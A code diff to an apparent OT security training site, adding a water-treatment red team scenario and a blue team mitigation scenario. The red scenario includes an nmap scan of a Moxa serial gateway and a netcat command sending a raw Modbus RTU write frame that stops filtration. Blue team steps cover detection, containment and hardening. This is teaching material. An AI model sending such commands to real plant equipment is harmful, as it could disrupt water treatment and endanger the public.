@@ -14,6 +14,7 @@ const domainTitles = {
 
 const industryDashboardUrl = "http://172.16.17.204:1880/ui/#!/4?socketid=zxL7Ex3NoOUjbRHMAAAB";
 const dataCenterDashboardUrl = "http://172.16.17.204:1880/ui/#!/7?socketid=vmNCQThlV3IuIaD_AAAV";
+const waterTreatmentDashboardUrl = "http://172.16.17.204:1880/ui/#!/1?socketid=F6KardZPucXn7VJVAAAf";
 
 const scriptCode = {
   single: `import paho.mqtt.client as mqtt
@@ -211,7 +212,77 @@ run`,
   }
 };
 
+const waterTreatmentScenarios = {
+  red: {
+    kicker: "Red Team Scenario",
+    title: "Water Treatment Moxa Modbus RTU Attack Surface",
+    summary: "Students simulate an authorized lab-only Modbus RTU-over-TCP command injection path against the Water Treatment model and observe filtration or recycle pump behavior on the dashboard.",
+    badges: ["Moxa NPort", "Modbus RTU over TCP", "Port 4001", "Water Treatment"],
+    steps: [
+      "Open the Water Treatment dashboard and use the approved dashboard controls to start the physical model.",
+      "Identify the Moxa NPort device in the Water Treatment network and confirm the approved lab target IP.",
+      "Confirm that TCP port 4001 is reachable on the Moxa device.",
+      "Use the approved Modbus RTU HEX command generated for the lab to send a command through netcat.",
+      "Observe the dashboard and physical model for filter or pump state changes.",
+      "Restore the model using the approved dashboard controls before ending the drill."
+    ],
+    actionTitle: "Moxa Lab Commands",
+    commands: `# Approved lab target
+MOXA_IP=172.16.17.133
+MOXA_PORT=4001
+
+# Confirm the Moxa serial gateway port is reachable
+nmap -p 4001 $MOXA_IP
+
+# Lab example: generated Modbus RTU command used to stop filtration
+python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('01100000000102014D67F5'))" | nc $MOXA_IP $MOXA_PORT
+
+# Safety note:
+# Run only approved HEX commands for this lab and restore the model from the dashboard after testing.`,
+    links: [
+      { label: "Open Water Treatment Dashboard", href: waterTreatmentDashboardUrl }
+    ]
+  },
+  blue: {
+    kicker: "Blue Team Scenario",
+    title: "Water Treatment Mitigation And Response",
+    summary: "Students defend the Water Treatment model by detecting unauthorized commands through the Moxa gateway, restoring filtration and recycle pump operation, and documenting OT hardening steps.",
+    badges: ["Detect", "Contain Moxa Access", "Restore Pumps", "Harden OT"],
+    steps: [
+      "Detect: monitor the Water Treatment dashboard for unexpected filtration stop or recycle pump changes.",
+      "Confirm: compare dashboard state with the physical model and expected operator actions.",
+      "Contain: stop the unauthorized netcat/Python session and isolate the attacking Kali host from the Water Treatment network.",
+      "Recover: use the approved dashboard controls to restart filtration and pump operation.",
+      "Validate: confirm filtration and recycle pump state are stable on the dashboard and physical model.",
+      "Harden: restrict TCP/4001 to trusted engineering/HMI hosts, segment the Moxa gateway, log serial gateway connections, alert on unauthorized write commands, and document approved Modbus command use."
+    ],
+    actionTitle: "Mitigation Steps",
+    commands: `1. Stop unauthorized activity:
+   Close the Python/netcat command session
+   Isolate the suspicious Kali host from the Water Treatment network
+
+2. Restore safe plant operation:
+   Open the Water Treatment dashboard
+   Restart filtration and recycle pump using approved controls
+
+3. Validate recovery:
+   Confirm dashboard state matches the physical model
+   Check that filtration and pump indicators stay stable
+
+4. Hardening checklist:
+   Restrict TCP/4001 to trusted HMI or engineering hosts
+   Segment the Moxa serial gateway from student networks
+   Log and alert on Moxa gateway sessions
+   Alert on unauthorized Modbus RTU write commands
+   Maintain an approved command/register inventory`,
+    links: [
+      { label: "Open Water Treatment Dashboard", href: waterTreatmentDashboardUrl }
+    ]
+  }
+};
+
 function getScenario(domain, mode) {
+  if (domain === "water-treatment") return waterTreatmentScenarios[mode] || waterTreatmentScenarios.red;
   if (domain === "industry") return industryScenarios[mode] || industryScenarios.red;
   if (domain === "data-center") return dataCenterScenarios[mode] || dataCenterScenarios.red;
   const title = domainTitles[domain] || "Model";
